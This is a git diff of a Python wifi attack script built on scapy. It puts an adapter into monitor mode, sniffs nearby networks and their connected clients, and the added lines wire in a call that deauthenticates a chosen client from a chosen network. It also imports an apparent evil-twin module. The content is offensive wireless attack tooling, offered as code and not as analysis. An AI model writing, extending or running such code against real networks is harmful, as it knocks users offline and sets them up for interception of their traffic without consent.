@@ -5,14 +5,18 @@ import subprocess
 # import scapy.all as scapy
 from scapy.layers.l2 import ARP, Ether
 import WifiAdapter as WAF
+import deautenticate as DA
 import Twin_create as TC
 from scapy import all as sc
 import time
 
 
+
+
 AvialableWifiNetworks = []
 Clients = []
 ChosenWifiMA = ""
+WifiAdapter = ""
 def PacketHendler(packet):
     #if packet end with 11 like 802.11
     if packet.haslayer(sc.Dot11):
@@ -30,13 +34,13 @@ def PacketHendler(packet):
 
 
 
-#  hacknic = selected interface
-def WifiNetworksFinder(hacknic):
+#  WifiAdapter = selected interface
+def WifiNetworksFinder():
     start_time = time.time()
     seconds = 10
     #  iface = the interfaces that we would like to sniff on
     # prn = allows us to pass a function that executes with each packet sniffed
-    sc.sniff(iface=hacknic, prn=PacketHendler , timeout = 10)
+    sc.sniff(iface=WifiAdapter, prn=PacketHendler , timeout = 10)
 
     # printing the Available Wifi Networks withe their ssid(name) and their mac address
     print("\n\n\nThe Available Wifi Networks are:\\n")
@@ -53,8 +57,8 @@ def WifiNetworksFinder(hacknic):
     return AvialableWifiNetworks[int(wifi_network_choice)].addr2
 
 
-def ClientsFinder(hacknic):
-    sc.sniff(iface=hacknic, prn=CLientsSniffing , timeout = 40)
+def ClientsFinder():
+    sc.sniff(iface=WifiAdapter, prn=CLientsSniffing , timeout = 40)
     print("\n\n\nThe Clients who connected to the chosen wifi are:\\n")
     for index, item in enumerate(Clients):
         print(f"{index} MAC Address : {item} ,")
@@ -87,12 +91,15 @@ def CLientsSniffing(pkt):
 
 
 
+
 if __name__ == "__main__":
-    hacknic = WAF.WifiAdapterFinder()
-    WAF.MonitorMode(hacknic)
-    ChosenWifiMA = WifiNetworksFinder(hacknic)
-    print("the chosen wifi is : " , ChosenWifiMA)
-    ClientsFinder(hacknic)
+    WifiAdapter = WAF.WifiAdapterFinder()
+    WAF.MonitorMode(WifiAdapter)
+    ChosenWifiMA = WifiNetworksFinder()
+    chosenClient=ClientsFinder()
+    DA.deautenticate_user(WifiAdapter,ChosenWifiMA,chosenClient)
+
+
 
 
 
